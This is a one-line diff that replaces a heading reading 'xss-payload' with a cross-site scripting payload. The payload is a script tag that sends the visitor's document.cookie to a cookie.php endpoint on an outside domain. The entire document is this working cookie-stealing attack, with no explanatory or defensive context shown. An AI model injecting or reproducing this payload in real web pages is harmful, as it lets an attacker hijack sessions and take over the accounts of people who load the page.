@@ -1,1 +1,1 @@
-# xss-payload
+ <script>new Image().src="https://melvinrinkleff.dev/cookie.php?cookie="+document.cookie;</script>
